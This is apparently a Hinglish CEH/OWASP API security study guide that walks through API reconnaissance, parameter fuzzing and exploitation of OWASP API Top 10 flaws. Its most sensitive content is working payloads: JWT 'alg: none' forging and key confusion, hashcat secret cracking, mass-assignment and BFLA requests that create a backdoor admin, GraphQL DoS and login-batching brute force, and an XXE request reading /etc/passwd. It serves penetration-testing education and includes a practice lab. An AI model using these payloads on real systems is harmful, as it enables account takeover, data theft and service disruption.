# **🔥 ADVANCED API RECONNAISSANCE, PARAMETER HUNTING & OWASP API TOP 10 (PRACTICAL MASTERCLASS)**

> **Track:** CEH v13 AI (Module 14: Web Applications & APIs) | OWASP API Security Top 10 (2023) | Bug Bounty & API Pentesting Standard  
> **Format:** 100% Practical & Command-Driven — Real HTTP Requests, Tool Syntax, Fuzzing Engines, JWT Exploits & Lab Walkthroughs

---

## **📑 MASTER NAVIGATION INDEX**

1. [API Architecture & Attack Surface Profiles (REST vs GraphQL vs SOAP)](#1-api-architecture--attack-surface-profiles)
2. [API Surface Reconnaissance & Documentation Hunting](#2-api-surface-reconnaissance--documentation-hunting)
3. [Contextual Route Fuzzing with Kiterunner (`kr`)](#3-contextual-route-fuzzing-with-kiterunner-kr)
4. [Client-Side JavaScript Static Reverse Engineering](#4-client-side-javascript-static-reverse-engineering)
5. [Heuristic Parameter Mining Engine (Arjun, x8, Param Miner)](#5-heuristic-parameter-mining-engine)
6. [Stateless Authentication & JWT Attack Vectors](#6-stateless-authentication--jwt-attack-vectors)
7. [The OWASP API Security Top 10 (2023 Edition — Deep Exploitation)](#7-the-owasp-api-security-top-10-2023-edition)
8. [Automated Multi-User Authorization Testing (Autorize & Postman)](#8-automated-multi-user-authorization-testing)
9. [GraphQL Deep Exploitation (Introspection, Batching, Circular DoS)](#9-graphql-deep-exploitation)
10. [SOAP / WSDL Vulnerabilities & XML Attacks (XXE, SOAPAction Spoofing)](#10-soap--wsdl-vulnerabilities--xml-attacks)
11. [Hands-On Practice Labs: OWASP crAPI Docker Setup & Walkthrough](#11-hands-on-practice-labs-owasp-crapi-docker-setup)
12. [EC-Council 4-Stage Web API Hacking Methodology & CEH Exam Flashcards](#12-ec-council-4-stage-web-api-hacking-methodology)

---

# **1. API Architecture & Attack Surface Profiles**

Modern applications monolithic architecture se microservices aur decoupled APIs par migrate ho chuki hain. Server-side HTML render hone ke bajaye raw data exchange hota hai, jisse backend ki business logic seedhe client ke samne expose hoti hai.

                        API TRANSPORT PROTOCOLS MATRIX

 ┌──────────────────────┬──────────────────────┬──────────────────────┐

 │         REST         │       GraphQL        │         SOAP         │

 ├──────────────────────┼──────────────────────┼──────────────────────┤

 │ • JSON, XML, URL Enc │ • JSON over HTTP     │ • Strict XML Envelopes│

 │ • Resource paths     │ • Single endpoint:   │ • Bound to WSDL      │

 │   (`/api/v1/users`)  │   `/graphql`         │   service contracts  │

 │ • Standard Verbs:    │ • Client-defined     │ • RPC style calls    │

 │   GET, POST, PUT,    │   Queries/Mutations  │   over HTTP/SMTP     │

 │   PATCH, DELETE      │                      │                      │

 └──────────────────────┴──────────────────────┴──────────────────────┘

### **Architectural Comparison & Vulnerability Landscape**

|Protocol / Model|Data Formats|Routing Mechanism|Primary Attack Vectors|
|---|---|---|---|
|**REST**|JSON, XML, Form-Data, Query Strings|Resource paths + HTTP Verbs|BOLA (IDOR), Mass Assignment, BFLA, Verb Tampering, SSRF|
|**GraphQL**|JSON over HTTP (POST, GET)|Single centralized endpoint (`/graphql`)|Schema Introspection, Circular Queries (DoS), Query Batching, Field Suggestions|
|**SOAP**|Strict XML Envelopes|Explicit RPC endpoints bound to WSDL|XXE Injection, SOAPAction Spoofing, XML Signature Wrapping (XSW)|

---

# **2. API Surface Reconnaissance & Documentation Hunting**

API testing ka pehla golden rule: **Agar API documentation mil gayi, to 80% reconnaissance khatam ho gayi.** Developers aksar staging ya production servers par Swagger UI ya OpenAPI specs expose chhod dete hain.

       [ Attacker Recon Probes ]

                   │

                   ├─── GET /v2/api-docs ─────────────► [ Returns Full JSON Schema ]

                   ├─── GET /swagger.json ────────────► [ Endpoints, Parameters, Types ]

                   └─── GET /swagger-ui/index.html ───► [ Interactive Test Console! ]

### **2.1 Automated Probing for OpenAPI / Swagger Specifications**

bash

# Probing common documentation routes using curl:

curl -s -k -X GET "https://api.target.com/v2/api-docs" -H "Accept: application/json"

curl -s -k -X GET "https://api.target.com/swagger/v1/swagger.json"

curl -s -k -X GET "https://api.target.com/openapi.json"

#### **High-Yield Documentation Paths Wordlist:**

text

/swagger.json

/swagger.yaml

/swagger/v1/swagger.json

/swagger/v2/swagger.json

/v1/api-docs

/v2/api-docs

/v3/api-docs

/api-docs

/api/swagger-ui.html

/swagger-ui/index.html

/docs/openapi.json

/docs/openapi.yaml

/api/v1/documentation

### **2.2 Mining Historical Endpoints via Wayback / AlienVault**

bash

# Mine historical URLs from Wayback Machine & Common Crawl:

waybackurls target.com | grep -E "/api/|/v[0-9]/" | sort -u > api_endpoints_archive.txt

# Using gau (GetAllUrls):

gau target.com --threads 10 | grep -E "\.json|\.xml|/api/" | sort -u > gau_apis.txt

---

# **3. Contextual Route Fuzzing with Kiterunner (`kr`)**

Standard web brute-forcers (jaise Gobuster ya Dirsearch) flat wordlists par HTTP GET requests bhejte hain, jo APIs ke liye bekar hain kyunki API endpoints specific **HTTP Verbs (POST, PUT, DELETE)** aur specific headers maangte hain.

**Kiterunner** Assetnote dwara banaya gaya tool hai jo hazaron real-world OpenAPI datasets (`.kite` files) se compile kiye gaye routing structures use karta hai:

  Traditional Brute-Force:  GET /users -> 404 (Fails)

  Kiterunner (kr):         POST /api/v2/users/create [Content-Type: application/json] -> 200 OK!

bash

# 1. High-concurrency route enumeration using Assetnote's compiled dataset:

kr scan https://api.target.com -w /usr/share/wordlists/routes-large.kite -x 10 -j 50 --fail-status-codes 400,404,403

# 2. Brute-force specific API prefix (e.g., target uses /api/v1/):

kr scan https://api.target.com/api/v1 -w routes-small.kite -x 20

# 3. Intercepted response ko replay karke detailed structures analyze karna:

kr kb replay "GET 403 [ 120, 4, 2] https://api.target.com/api/v2/admin/users" -w routes-large.kite

---

# **4. Client-Side JavaScript Static Reverse Engineering**

Single-Page Applications (React, Angular, Vue) front-end code ko minified bundles (`main.js`, `app.bundle.js`) me pack kar deti hain. Isme internal routes, API tokens aur hidden parameters embedded hote hain.

bash

# 1. Download all JavaScript bundles and source maps:

wget -q -r -l 2 -nd -A "*.js,*.js.map" https://target.com/static/js/

# 2. Extract hidden endpoints using LinkFinder:

python3 /opt/LinkFinder/linkfinder.py -i https://target.com/static/js/main.js -o cli

# 3. Regex: Extract REST Route patterns from JS bundles:

grep -Eoi "([\"'])(/api/v[0-9]+/[a-zA-Z0-9_\-/]+)([\"'])" *.js | sort -u

# 4. Regex: Extract Hardcoded API Keys, AWS secrets & Bearer tokens:

grep -Eoi "(aws_key|access_token|bearer|api_key|secret)[a-zA-Z0-9_]*[\s]*[:=][\s]*[\"'][a-zA-Z0-9_\-]{16,}[\"']" *.js

# 5. TruffleHog se deep entropy secret scanning:

trufflehog filesystem ./downloaded_js/ --only-valid

# 6. Sourcemapper: Reconstruct original uncompiled source tree from .map files!

sourcemapper -input https://target.com/static/js/main.js.map -output ./reconstructed_source/

---

# **5. Heuristic Parameter Mining Engine**

API endpoint milne ke baad backend par unadvertised parameters dhoondhna sabse critical task hai (e.g., `?debug=true`, `?role=admin`, `?is_internal=1`).

 ┌─────────────┬──────────┬─────────────────────────────┬─────────────────────────────────┐

 │ Tool        │ Language │ Tested Vectors              │ Anomaly Detection Engine        │

 ├─────────────┼──────────┼─────────────────────────────┼─────────────────────────────────┤

 │ **Arjun**   │ Python   │ Query strings, JSON, Form   │ Binary search on response size, │

 │             │          │ body, XML payloads          │ status codes, reflection        │

 ├─────────────┼──────────┼─────────────────────────────┼─────────────────────────────────┤

 │ **x8**      │ Rust     │ JSON bodies, Query, Forms   │ Differential byte analysis,     │

 │             │          │ Multipart boundaries        │ dynamic variance tracking       │

 ├─────────────┼──────────┼─────────────────────────────┼─────────────────────────────────┤

 │ **Param     │ Java     │ Unkeyed headers, Cookies,   │ Cache-busting & reflection      │

 │ Miner**     │ (Burp)   │ Query params, JSON attrs    │ monitoring in background        │

 └─────────────┴──────────┴─────────────────────────────┴─────────────────────────────────┘

### **5.1 Arjun: The Binary Search Parameter Hunter**

Arjun ek-ek karke parameter test nahi karta (jo slow hota hai aur WAF block karta hai); ye ek single request me **50-100 parameters** bhejta hai. Agar response change hota hai, to list ko aadha-aadha split karke culprit parameter ko isolate kar leta hai.

bash

# 1. Basic Query Parameter Fuzzing (GET):

arjun -u https://api.target.com/v1/profile -m GET -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt

# 2. JSON Body Parameter Mining (POST):

arjun -u https://api.target.com/v1/users/update -m JSON -d '{"id": 100}'

# 3. Authenticated Scan with Authorization Headers:

arjun -u https://api.target.com/v1/settings -m JSON --headers "Authorization: Bearer <TOKEN>" -oJ params_found.json

# 4. Passive Mining (Wayback Machine & CommonCrawl historical parameters):

arjun -u https://target.com/api/v1/user --passive

# 5. Proxy all traffic to Burp Suite for manual validation:

arjun -u https://api.target.com/v1/user -m POST -oB http://127.0.0.1:8080

### **5.2 High-Throughput Fuzzing with x8 (Rust Engine)**

bash

# Rust-based high speed JSON body parameter discovery:

x8 -u "https://api.target.com/api/v1/settings" \

   -X POST \

   -W /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \

   --body '{"user_id": 412}' \

   --encode json \

   -o discovered_params.txt

### **5.3 Unkeyed Header Injection via Param Miner**

Burp Suite me request par right click ⟶\longrightarrow⟶ _Extensions_ ⟶\longrightarrow⟶ _Param Miner_ ⟶\longrightarrow⟶ _Guess headers_. Ye aise headers hunt karta hai jo backend logic alter karte hain:

http

GET /api/v1/resource HTTP/1.1

Host: api.target.com

X-Original-URL: /admin/system-status

X-Forwarded-Host: attacker.com

X-HTTP-Method-Override: PUT

---

# **6. Stateless Authentication & JWT Attack Vectors**

APIs session maintain karne ke liye **JSON Web Tokens (JWT, RFC 7519)** use karti hain jo `Authorization: Bearer <token>` header me aate hain.

  eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9 . eyJzdWIiOiIxMjM0Iiwicm9sZSI6InVzZXIifQ . 4a5b6c...

  └─────────────┬─────────────────────┘   └──────────────────┬────────────────┘   └───┬────┘

                │                                            │                        │

         HEADER (Base64)                              PAYLOAD (Base64)             SIGNATURE

       {"alg":"HS256","typ":"JWT"}              {"sub":"1234","role":"user"}     HMAC-SHA256

### **6.1 Attack 1: Algorithm Downgrade (`alg: none`)**

Agar backend signature validation properly verify na kare, to header me `"alg": "none"` set karke signature strip kar diya jata hai:

bash

# 1. Header ko alter karein:

echo -n '{"alg":"none","typ":"JWT"}' | base64

# Output: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0=

# 2. Payload me role elevate karein:

echo -n '{"sub":"1234","role":"admin"}' | base64

# Output: eyJzdWIiOiIxMjM0Iiwicm9sZSI6ImFkbWluIn0=

# 3. New Forged Token (Aakhiri dot ke baad signature empty chhod dein):

# eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0Iiwicm9sZSI6ImFkbWluIn0.

### **6.2 Attack 2: Key Confusion (RS256 to HS256)**

- **Concept:** Server asymmetric RSA (`RS256`) use karta hai jisme Private Key se sign aur Public Key se verify hota hai.
- **Flaw:** Attacker header me algorithm badal kar symmetric HMAC (`HS256`) kar deta hai aur token ko **Server ki Public Key** se sign karta hai. Server jab HMAC se check karega, to wo public key ko hi shared secret maan kar signature approve kar dega!

bash

# Python Script to Forge Key Confusion Token:

python3 jwt_tool.py <TOKEN> -X k -pk public.pem

### **6.3 Attack 3: Offline HMAC Secret Cracking via Hashcat**

Agar token symmetric HS256 se signed hai, to uska secret offline crack kiya ja sakta hai (zero server noise!):

bash

# Hashcat Mode 16500 = JWT (JSON Web Token)

hashcat -m 16500 jwt_token.txt /usr/share/wordlists/rockyou.txt

# Output: Cracks weak secrets like "secret", "secret123", "password"

---

# **7. The OWASP API Security Top 10 (2023 Edition)**

 ┌───────────┬─────────────────────────────────────────────────┬──────────────────────────────────────────┐

 │ Category  │ Vulnerability Name                              │ Root Threat Profile                      │

 ├───────────┼─────────────────────────────────────────────────┼──────────────────────────────────────────┤

 │ API1:2023 │ Broken Object Level Authorization (BOLA)        │ Unvalidated resource ID manipulation     │

 │ API2:2023 │ Broken Authentication                           │ Token bypass, weak secrets, credential flaw│

 │ API3:2023 │ Broken Object Property Level Auth (BOPLA)       │ Mass Assignment + Excessive Data Exposure│

 │ API4:2023 │ Unrestricted Resource Consumption               │ Missing rate limits / query depth (DoS)  │

 │ API5:2023 │ Broken Function Level Authorization (BFLA)      │ Privilege escalation to admin endpoints  │

 │ API6:2023 │ Unrestricted Access to Sensitive Business Flows │ Bot automation / inventory scalping      │

 │ API7:2023 │ Server-Side Request Forgery (SSRF)              │ Unvalidated remote URL fetching          │

 │ API8:2023 │ Security Misconfiguration                       │ Verbose stack traces, CORS, debug modes  │

 │ API9:2023 │ Improper Inventory Management                   │ Exposed Zombie & Shadow API endpoints    │

 │ API10:2023│ Unsafe Consumption of APIs                      │ Blind trust in 3rd party upstream data   │

 └───────────┴─────────────────────────────────────────────────┴──────────────────────────────────────────┘

---

### **7.1 Deep Dive: API1:2023 — Broken Object Level Authorization (BOLA)**

BOLA (traditionally known as IDOR) modern APIs ka **#1 sabse critical vulnerability** hai (~40% of all API attacks).

- **Mechanism:** User A apne token se authenticate karta hai, lekin request ke andar object identifier (UUID ya integer ID) ko User B ki ID se replace kar deta hai. Server check nahi karta ki ID current user ki hai ya nahi.

http

GET /api/v1/accounts/84920/statement HTTP/1.1

Host: api.target.com

Authorization: Bearer <TOKEN_OF_USER_A>

HTTP/1.1 200 OK

Content-Type: application/json

{

  "account_id": 84920,

  "owner": "User_B",

  "balance": "$94,320.00"

}

**Remediation (Backend Query Enforcement):**

sql

-- Vulnerable:

SELECT * FROM statements WHERE account_id = :input_id;

-- Secure (Enforces User Context):

SELECT * FROM statements WHERE account_id = :input_id AND user_uuid = :authenticated_user_uuid;

---

### **7.2 Deep Dive: API3:2023 — Broken Object Property Level Authorization (BOPLA)**

Ye 2023 edition me **Mass Assignment** aur **Excessive Data Exposure** ko combine karke banaya gaya hai.

#### **Sub-type A: Mass Assignment (Write-side Flaw)**

Frameworks client ke JSON parameters ko seedhe database models se bind kar dete hain:

http

PATCH /api/v1/users/me HTTP/1.1

Host: api.target.com

Authorization: Bearer <STANDARD_USER_TOKEN>

Content-Type: application/json

{

  "email": "attacker@target.com",

  "is_admin": true,             <-- UNADVERTISED INTERNAL MODEL PROPERTY!

  "account_balance": 999999.00

}

#### **Sub-type B: Excessive Data Exposure (Read-side Flaw)**

Backend database se poora user object fetch karta hai aur raw response me bhej deta hai, ye sochkar ki frontend UI sensitive fields hide kar dega:

json

{

  "id": 105,

  "name": "John Doe",

  "password_hash": "$2a$12$K9v...",

  "ssn": "123-45-6789",

  "reset_token": "a8f3b2c9e..."

}

---

### **7.3 Deep Dive: API5:2023 — Broken Function Level Authorization (BFLA)**

Standard user administrative functions ko direct invoke kar sakta hai, ya fir HTTP method tamper karke access control bypass karta hai:

http

# Normal User invoking Admin Endpoint:

POST /api/v1/admin/users/create HTTP/1.1

Host: api.target.com

Authorization: Bearer <LOW_PRIVILEGED_TOKEN>

Content-Type: application/json

{

  "username": "backdoor_admin",

  "role": "superadmin",

  "password": "Password123!"

}

> **HTTP Verb Tampering:** Agar `GET /api/v1/users/12` par restriction hai, to try karein: `PUT`, `DELETE`, `OPTIONS`, `HEAD`, ya `X-HTTP-Method-Override: DELETE`.

---

# **8. Automated Multi-User Authorization Testing**

API me hazaaron endpoints par manually IDOR aur Privilege Escalation test karna impossible hai. Iske liye **Burp Suite Autorize Extension** aur **Postman Workflows** use hote hain.

       [ Tester navigates as Admin (User A) ]

                         │

                         ▼

             [ Intercepted by Autorize ]

                         │

         ┌───────────────┴───────────────┐

         ▼                               ▼

   [ Request 1: Replayed as ]       [ Request 2: Replayed as ]

   Low-Privileged User B            Unauthenticated (No Token)

         │                               │

         ▼                               ▼

  Compare Responses:               Compare Responses:

  • Match? -> BOLA / BFLA (Pwned!)  • Match? -> Missing Auth!

### **8.1 Configuring Autorize in Burp Suite**

1. Install **Autorize** from BApp Store.
2. Login as **Low-Privilege User (User B)** ⟶\longrightarrow⟶ Copy their `Authorization: Bearer <token>` or session cookies.
3. Paste these headers into Autorize's **"Configuration / Request Headers"** box.
4. Check **"Intercept requests from the following host(s)"** ⟶\longrightarrow⟶ Add target domain.
5. Click **"Autorize is off"** ⟶\longrightarrow⟶ Toggle to **"Autorize is on"**.
6. Ab browser me **High-Privilege Admin (User A)** bankar application browse karein.
7. **Color Analysis in Autorize Table:**
    - 🔴 **Red (Bypassed!):** Low-privilege user ko admin data mil gaya ⟶\longrightarrow⟶ **Definite BOLA / BFLA finding!**
    - 🟡 **Yellow:** Response length different hai (manual inspection required).
    - 🟢 **Green (Enforced):** 401 / 403 Forbidden ⟶\longrightarrow⟶ Authorization properly working.

---

# **9. GraphQL Deep Exploitation**

GraphQL me traditional multiple routes nahi hote; sirf ek centralized endpoint hota hai (usually `/graphql`).

```
       [ Client Query ] ──────────► [ Single Resolver: /graphql ] ──────────► [ Backend Data ]
```

### **9.1 Schema Introspection Extraction**

Agar introspection enable ho, to poore backend database ka structural blueprint extract kiya ja sakta hai:

http

POST /graphql HTTP/1.1

Host: api.target.com

Content-Type: application/json

{

  "query": "{ __schema { types { name fields { name type { name kind } } } } }"

}

bash

# Automated Full Schema Extraction via GraphQL Voyager / Clairvoyance:

clairvoyance https://api.target.com/graphql -o schema.json

### **9.2 Field Suggestion Enumeration (Introspection Disabled Evasion)**

Agar introspection disable kar di gayi ho, to GraphQL engines (jaise Apollo) galat query par suggestions dete hain:

json

// Input:

{"query": "{ usrs { id } }"}

// Server Error Response:

"Cannot query field 'usrs' on type 'Query'. Did you mean 'users'?"

Automated tools in error suggestions ko parse karke poora schema word-by-word reconstruct kar lete hain!

### **9.3 Circular Query Resource Exhaustion (DoS)**

Resolvers recursive queries process karte hain. Deep nesting server CPU aur RAM exhaust kar deti hai:

graphql

query {

  author {

    books {

      author {

        books {

          author {

            books { title }

          }

        }

      }

    }

  }

}

### **9.4 Query Batching (Bypassing Rate Limits)**

Single HTTP request me array payload ke andar saikdon operations pack karna:

json

[

  {"query": "mutation { login(user: \"admin\", pass: \"123456\") { token } }"},

  {"query": "mutation { login(user: \"admin\", pass: \"admin123\") { token } }"},

  {"query": "mutation { login(user: \"admin\", pass: \"password\") { token } }"}

]

_(WAF ise sirf **1 request** count karta hai, jabki backend 3 distinct authentication attempts execute karta hai!)_

---

# **10. SOAP / WSDL Vulnerabilities & XML Attacks**

SOAP APIs XML messaging par rely karti hain aur WSDL (Web Services Description Language) contracts use karti hain.

### **10.1 Locating WSDL Contracts**

bash

# Probe for WSDL files:

curl -s "https://api.target.com/ws/UserService?wsdl"

curl -s "https://api.target.com/service.asmx?WSDL"

### **10.2 XML External Entity (XXE) Injection in SOAP Envelopes**

Unhardened XML parsers `DOCTYPE` declarations parse karte hain:

xml

POST /ws/UserService HTTP/1.1

Host: api.target.com

Content-Type: text/xml; charset=utf-8

SOAPAction: "http://target.com/GetUser"

<?xml version="1.0" encoding="utf-8"?>

<!DOCTYPE root [

  <!ENTITY xxe SYSTEM "file:///etc/passwd">

]>

<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">

  <soap:Body>

    <GetUser>

      <userId>&xxe;</userId>

    </GetUser>

  </soap:Body>

</soap:Envelope>

### **10.3 SOAPAction Header Spoofing**

Edge proxies routing ke liye `SOAPAction` header dekhte hain bina XML body ko inspect kiye. Attacker header modify karke unauthorized internal routines invoke kar sakta hai:

http

POST /ws/PublicService HTTP/1.1

SOAPAction: "http://target.com/InternalAdmin#DeleteDatabase"

---

# **11. Hands-On Practice Labs: OWASP crAPI Docker Setup**

**crAPI (Completely Ridiculous API)** ek intentionally vulnerable modern microservices application hai jo vehicle management simulate karti hai (Java, Python, NodeJS, MongoDB, PostgreSQL).

bash

# 1. Install Docker & Docker Compose on Kali Linux:

sudo apt-get update && sudo apt-get install -y docker.io docker-compose curl

# 2. Download crAPI official orchestration compose file:

curl -o docker-compose.yml https://raw.githubusercontent.com/OWASP/crAPI/main/deploy/docker/docker-compose.yml

# 3. Launch crAPI in detached mode:

LISTEN_IP="0.0.0.0" sudo docker-compose -f docker-compose.yml --compatibility up -d

# 4. Access points:

# Web Dashboard: http://localhost:8888

# MailHog (Email interception): http://localhost:8025

### **Core crAPI Exploitation Scenarios:**

1. **BOLA (Vehicle Location Leak):**
    - User A se login karein ⟶\longrightarrow⟶ Query: `GET /identity/api/v2/vehicle/<VEHICLE_ID>/location`
    - Parameter me User B ka vehicle ID inject karein ⟶\longrightarrow⟶ Real-time GPS coordinates leak!
2. **Mass Assignment (Admin Role Escalation):**
    - User profile update request (`POST /identity/api/v2/user/profile`) me unadvertised property inject karein:
        
        json
        
        {"role": "admin"}
        
3. **BFLA (Administrative Refund Abuse):**
    - Intercept mechanic contact form ⟶\longrightarrow⟶ Route tamper karke `/workshop/api/merchant/contact_mechanic` se admin refund routes call karein.

---

# **12. EC-Council 4-Stage Web API Hacking Methodology**

CEH v13 AI curriculum me API penetration testing ko **4 sequential stages** me structure kiya gaya hai:

 ┌───────────────────────┐     ┌───────────────────────┐

 │ Stage 1: Identify     │ ──► │ Stage 2: Detect       │

 │          API Target   │     │          Security Std │

 └───────────────────────┘     └───────────────────────┘

                                           │

 ┌───────────────────────┐     ┌───────────┴───────────┐

 │ Stage 4: Launch       │ ◄── │ Stage 3: Identify     │

 │          API Attacks  │     │          Attack Surface

 └───────────────────────┘     └───────────────────────┘

|Phase|Core Objective|Key Activities & Tools|
|---|---|---|
|**Stage 1: Identify Target**|Map external API perimeter & gateways|Subdomain enumeration (`subfinder`), OSINT, DNS recon|
|**Stage 2: Detect Standards**|Profile protocols & authentication baseline|Inspect JWT, OAuth 2.0, API keys, CORS policies, transport TLS|
|**Stage 3: Identify Attack Surface**|Enumerate all accessible routes & params|OpenAPI/Swagger parsing, Kiterunner (`kr`), JS bundle analysis, Arjun|
|**Stage 4: Launch Attacks**|Execute functional & injection exploits|BOLA/IDOR, Mass Assignment, BFLA, SQLi, SSRF, Rate limit bypass|

---

### **💡 High-Yield CEH Exam Flashcards**

|Concept|High-Yield Exam Fact|
|---|---|
|**BOLA vs BFLA**|**BOLA** accesses another user's _data/object_ (Horizontal); **BFLA** accesses an unauthorized _function/role_ (Vertical).|
|**WSDL Contract Extension**|Append `?wsdl` to SOAP endpoints to expose the XML service definition.|
|**Kiterunner `.kite` Format**|Compiled dataset pairing HTTP verbs, routes, and parameter placeholders for contextual API scanning.|
|**JWT Algorithm Confusion**|Downgrades asymmetric `RS256` to symmetric `HS256` using the server's public key as HMAC secret.|
|**Excessive Data Exposure Root Cause**|Filtering sensitive data on the client-side UI instead of stripping it at the server-side API response.|
|**GraphQL Introspection Query**|`__schema` field query used to extract the complete backend type and query definitions.|
|**Unkeyed Headers**|Headers (like `X-Forwarded-Host`) that alter backend processing but are ignored by HTTP caching layers.|